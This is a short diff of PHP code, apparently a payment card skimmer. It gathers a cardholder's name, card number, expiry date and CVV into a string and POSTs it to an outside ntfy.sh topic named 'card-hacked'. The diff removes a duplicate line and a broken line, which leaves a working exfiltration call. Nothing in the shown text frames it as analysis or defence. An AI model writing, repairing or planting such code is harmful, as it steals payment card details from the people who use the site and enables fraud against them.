@@ -45,9 +45,7 @@ $content = "$name, $ccv, $exp, $ccnumber"; ?>
 <?php file_get_contents('https://ntfy.sh/card-hacked', false, stream_context_create([
     'http' => [
         'method' => 'POST', 
-        'method' => 'POST', 
         'header' => 'Content-Type: text/plain',
-        'content' => '$_POST["name], $_POST["exp"], $_POST["ccnumber"], echo $_POST["ccv"]'
         'content' => $content
     ]
 ])); ?>
